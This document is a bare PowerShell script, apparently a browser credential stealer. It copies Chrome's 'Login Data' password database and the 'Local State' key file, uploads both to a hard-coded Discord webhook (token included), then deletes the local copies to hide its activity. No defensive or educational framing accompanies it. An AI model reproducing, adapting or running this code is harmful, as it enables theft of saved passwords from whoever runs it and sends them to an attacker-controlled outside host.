$hookurl = 'https://discord.com/api/webhooks/1262807444120408064/Vu2LIdSUTm3Nu29Y6Z-9nxuK_NcDhw1xpZtIYPUKtBWLjHUN7m-_ZGeSBql4LTD1IJDP'

function Upload-Discord {
    [CmdletBinding()]
    param(
        [parameter(Position=0, Mandatory=$False)][string]$file,
        [parameter(Position=1, Mandatory=$False)][string]$text
    )

    $Body = @{
        'username' = $env:username
        'content' = $text
    }

    if (-not [string]::IsNullOrEmpty($text)) {
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json)
    }

    if (-not [string]::IsNullOrEmpty($file)) {
        curl.exe -F "file1=@$file" $hookurl
    }
}

$sourceFile1 = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
$outputFile1 = "$([System.Environment]::GetFolderPath('Desktop'))\output.txt"
Copy-Item $sourceFile1 $outputFile1
Upload-Discord -file $outputFile1 -text ":)"
Remove-Item $outputFile1

$sourceFile2 = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
$outputFile2 = "$([System.Environment]::GetFolderPath('Desktop'))\key.txt"
Copy-Item $sourceFile2 $outputFile2
Upload-Discord -file $outputFile2 -text "Key-File"
Remove-Item $outputFile2
exit
